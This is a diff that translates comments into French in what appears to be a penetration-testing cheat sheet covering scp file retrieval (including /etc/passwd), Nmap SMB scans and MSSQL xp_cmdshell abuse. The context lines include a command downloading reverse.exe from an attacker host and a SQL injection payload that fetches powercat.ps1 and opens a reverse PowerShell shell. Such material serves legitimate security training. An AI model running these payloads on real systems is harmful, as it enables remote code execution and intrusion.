@@ -763,7 +763,7 @@ scp user@192.168.1.10:/etc/config.txt user@192.168.1.10:/etc/passwd /home/user/
 scp -r user@remote_host:/path/to/remote/directory /local/destination/
 scp -r user@192.168.1.10:/var/www/html /home/user/
 
-# Downlaod a File from a Specific Port (dans le cas où SSH fonctionne sur un port non par défaut)
+# Télécharger un fichier via un port SSH non standard
 scp -P 2222 user@remote_host:/path/to/remote/file /local/destination/
 scp -P 2222 user@192.168.1.10:/etc/config.txt /home/user/
 
@@ -1649,7 +1649,7 @@ Examiner les objets, les droits et les services du domaine.
 <p class="oscp-command-note">Scanner les ports et services avec Nmap.</p>
 
 ```bash
-# Nmap scan
+# Scan Nmap
 nmap -v -p 139,445 [IP]
 nmap -p 139,445 --script-args=unsafe=1 --script /usr/share/nmap/scripts/smb-os-discovery <ip>
 
@@ -2199,11 +2199,11 @@ EXEC SP_CONFIGURE 'xp_cmdshell', 1;
 RECONFIGURE;
 GO
 
--- Test xp_cmdshell to execute system commands
+-- Tester xp_cmdshell pour exécuter une commande système
 EXEC xp_cmdshell 'whoami';
 GO
 
--- Download and execute a reverse shell
+-- Télécharger puis lancer un shell inversé
 EXEC xp_cmdshell 'powershell "Invoke-WebRequest -Uri http://<attacker_ip>:<port>/reverse.exe -OutFile c:\\Users\\Public\\reverse.exe"';
 GO
 
@@ -2214,7 +2214,7 @@ GO
 
 
 ```sql
--- SQL Injection example to execute system commands
+-- Exemple d'injection SQL permettant de tester l'exécution de commandes
 test'; EXEC master.dbo.xp_cmdshell 'powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString(''http://<attacker_ip>:<port>/powercat.ps1'');powercat -c <attacker_ip> -p <port> -e powershell"';--
 
 ```
